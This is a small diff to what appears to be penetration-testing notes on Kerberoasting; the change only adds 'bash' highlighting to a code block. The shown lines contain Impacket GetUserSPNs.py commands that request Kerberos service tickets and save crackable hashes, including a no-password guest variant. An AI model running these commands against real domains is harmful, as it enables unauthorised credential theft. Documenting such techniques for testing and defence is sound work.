@@ -10,7 +10,7 @@ GetUserSPNs.py domain.local/USER:PASSWORD@DC_IP {-dc-ip} DC_IP -request -outputf
 
 If you have guest access with no password, and you have a list of users, this attack might work:
 
-```
+```bash
 GetUserSPNs.py domain.local/guest -usersfile users.txt -request -outputfile kerb.hashcat -dc-ip DC_IP -no-pass
 ```
 
